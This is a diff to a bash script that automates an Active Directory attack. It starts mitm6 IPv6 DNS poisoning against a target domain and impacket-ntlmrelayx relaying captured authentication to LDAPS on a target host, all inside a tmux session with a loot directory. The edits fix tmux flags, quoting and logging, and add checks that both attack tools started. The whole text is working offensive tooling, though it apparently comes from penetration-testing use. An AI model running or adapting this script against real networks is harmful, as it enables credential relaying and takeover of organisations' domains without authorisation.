@@ -136,7 +136,7 @@ mkdir -p "$loot_dir"
 
 # Suppress console output if silent mode is enabled
 if [[ "$silent" -eq 1 ]]; then
-  exec >"$log_file" 2>&1
+  exec >>"$log_file" 2>&1
 else
   exec > >(tee -a "$log_file") 2>&1
 fi
@@ -155,13 +155,13 @@ cleanup() {
 trap cleanup EXIT INT TERM
 
 # Create a new tmux session
-tmux has-session -A -s "$session_name" 2>/dev/null && {
+tmux has-session -t "$session_name" 2>/dev/null && {
   echo -e "${RED}Session already exists${RESET}"
   exit 1
 }
 
 echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
-tmux new-session -A -s "$session_name" || {
+tmux new-session -d -s "$session_name" || {
   echo -e "${RED}Failed to create tmux session${RESET}"
   exit 1
 }
@@ -183,15 +183,24 @@ start_tmux_window() {
 # Start mitm6 in tmux session
 echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
 start_tmux_window "$session_name" "mitm6" \
-mitm6 -i "$interface" -d "$target_domain" || {
+"mitm6 -i \"$interface\" -d \"$target_domain\"" || {
   echo -e "${RED}Failed to start mitm6.${RESET}"
   exit 1
 }
 
+started=0
 for i in {1..5}; do
-  pgrep -fa "mitm6.*$target_domain" >/dev/null && break
+  if pgrep -fa "mitm6.*$target_domain" >/dev/null; then
+    started=1
+    break
+  fi
   sleep 1
 done
+
+[[ "$started" -eq 1 ]] || {
+  echo -e "${RED}mitm6 failed to start${RESET}"
+  exit 1
+}
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
@@ -201,11 +210,19 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" \
   exit 1
 }
 
+started=0
 for i in {1..5}; do
-  pgrep -fa "impacket-ntlmrelayx.*ldaps://$target_ip" >/dev/null && break
+  if pgrep -fa "impacket-ntlmrelayx" | grep -q "$target_ip"; then
+    started=1
+    break
+  fi
   sleep 1
 done
 
+[[ "$started" -eq 1 ]] || {
+  echo -e "${RED}ntlmrelayx failed to start${RESET}"
+  exit 1
+}
 
 # Disable verbose logging
 if [ "$verbose" -eq 1 ]; then
